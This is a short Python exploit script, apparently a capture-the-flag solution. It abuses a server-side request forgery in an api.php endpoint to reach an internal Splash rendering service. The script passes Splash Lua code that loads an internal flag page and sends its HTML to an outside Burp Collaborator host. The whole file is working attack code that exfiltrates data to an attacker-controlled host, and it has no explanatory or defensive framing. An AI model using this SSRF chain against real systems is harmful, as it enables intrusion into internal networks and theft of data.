#!/usr/bin/env python3

import requests

URL = "http://lvh.me:9000/api.php"

LUA_SOURCE = """
function main(splash, args)
  splash:go("http://172.16.0.14/flag.php")
  splash:wait(0.5)
  splash:go("http://t4ym4jedtgxalufq6ofht5b7xy3rrg.burpcollaborator.net/" ..  splash:html())
  splash:wait(0.5)
  return "Ok"
end
"""

response = requests.get(URL, params = {"url": "http://splash:8050/execute?lua_source=" + LUA_SOURCE})
print(response.text)
